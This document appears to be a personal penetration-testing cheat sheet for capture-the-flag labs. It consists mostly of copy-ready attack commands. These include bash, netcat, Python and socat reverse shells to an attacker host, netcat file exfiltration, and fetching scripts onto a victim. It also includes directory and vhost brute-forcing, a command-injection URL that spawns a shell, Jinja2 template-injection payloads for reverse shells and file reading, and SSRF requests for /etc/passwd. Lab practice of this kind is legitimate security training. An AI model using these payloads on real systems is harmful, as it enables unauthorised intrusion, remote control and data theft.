# Cheat sheet with my popular tools

> Victim host 10.10.10.77 and Kali host 10.10.10.10

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/cat.PNG)

# Useful Commands

## Create web server

* #### With Python

```
python3 -m http.server 8888
``` 

```
python -m SimpleHTTPServer 8888
```

## Upgrade reverse shell

* #### With Socat

*Victim:* 
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
chmod +x socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```
        
*Kali:*
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

* #### With Python

*Victim:* 
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Send files

* #### With netcat

*Victim:*
```
cat file.txt | nc -q 0 10.10.10.10 4444
```

*Kali:*
```
nc -lvp 4444 > file.txt
```

* #### With web server

*Kali:*
```
python3 -m http.server 8888 
python -m SimpleHTTPServer 8888
```

*Victim:*
```
wget http://10.10.10.10:8888/script.sh -O script.sh
```

* #### With SCP

*Copy from Victim*
```
scp user@10.10.10.77:/home/user/file.txt /home/kali/
```

*Copy to Victim* 
```
scp -r /home/kali/file.txt user@10.10.10.77:/home/user/
```

## Reverse shells [:octocat:](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

* #### With bash

```
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'
```

* #### With netcat

```
nc -e /bin/sh 10.10.10.10 4444
```

* #### With python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* #### Listener

```
nc -lvp 4444
```

## Enumeration

* #### Nmap

TCP Scan:

```
nmap -sV -sC -p- 10.10.10.77
```

UDP Scan:

```
nmap -sU -sV -p- 10.10.10.77
```

## If Web Server

### Brute dir with extensions

* #### GoBuster

```
gobuster dir -e -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,txt,htm,html,phtml,js,zip,rar,tar -s 200,302
```

* #### FuFF

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://academy.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -mc 200,302
```

### VHOST Discovery

* #### FuFF

```
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://schooled.htb/ -H "Host:FUZZ.schooled.htb" -fw 5338
```

### CSRF

Check CSRF

```
<a href="http://10.10.10.10:4444">MyURL</a>
```

Reverse shell

```
http://10.10.10.10/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.10.10'$IFS'4444')
```

### SSTI [:octocat:](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

![](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png?alt=media&token=4b40cf58-5561-4925-bc86-1d4689ca53d1)

* #### Check Jinja2

```
{{7*'7'}} would result in 7777777
{{config.items()}}
```

 >Reverse shell

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'").read()}}{%endif%}{%endfor%}
```

```
{{request.application.globals.builtins.import('os').popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"').read()}}
```

>RCE

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

* #### Check Twig

```
{{7*'7'}} would result in 49
{{dump(app)}}
```

### SSRF

```
GET /?url=http://corp.local

GET /?url=http://localhost/server-status

GET /?url=file:///etc/passwd 
```

## Privilege Escalation

## Reverse Engineering

## Some Scripts

## References
